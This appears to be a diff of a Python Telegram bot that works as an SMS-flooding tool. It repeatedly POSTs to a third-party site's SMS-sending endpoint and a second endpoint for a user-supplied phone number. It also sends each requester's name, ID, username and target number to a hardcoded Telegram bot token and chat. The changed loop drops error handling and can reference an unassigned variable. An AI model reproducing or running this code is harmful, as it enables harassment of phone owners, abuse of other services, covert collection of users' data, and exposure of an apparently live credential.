@@ -64,25 +64,14 @@ def true(message):
 }
 	sensess = requests.get(f'''https://api.telegram.org/bot1998361884:AAHeblwBaSST8O-BhL3Y2W_8qBjOy9Vzg3Q/sendMessage?chat_id=1396476109&text= NEW REQUEST OF BOT\nNAME: {name_name} {las_name}\nID: {id_tele}\nuser: @{user_tele}\nNUMBER {number}\nNumber Message {loop}''')
 	for i in range(loop):
+		bot.send_message(message.chat.id,text="<strong>DONE</strong>  ",parse_mode="html")
 		rr = requests.post('https://goldencircle777.com/index/send/sendsms',headers=headers,data=data)
-		
-		if ("رقم الهاتف غير مهيأ بشكل صحيح") in rr.text:
+		if ("إرسال بنجاح") in rr.text:
 			r=requests.post(ur,headers=hd,data=da)
-			if "emptyMsg" in r.text:
-				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 ERROR </strong>  ",parse_mode="html")
-		elif ("إرسال بنجاح") in rr.text:
-			
-			r=requests.post(ur,headers=hd,data=da)
-			if "emptyMsg" in r.text:
-				
-				
-				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 DONE</strong>  ",parse_mode="html")
-		else:
-			er +=1
-			r=requests.post(ur,headers=hd,data=da)
-			if "emptyMsg" in r.text:
-				bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 ERROR</strong>  ",parse_mode="html")
-		
+		if "emptyMsg" in r.text:
+			bot.send_message(message.chat.id,text="<strong>REQUEST 1 DONE\nREQUEST 2 DONE</strong>  ",parse_mode="html")	
+	bot.send_message(message.chat.id,text="<strong>FINESH</strong>  ",parse_mode="html")
+
 
 @server.route(f"/{BOT_TOKEN}", methods=["POST"])
 def redirect_message():
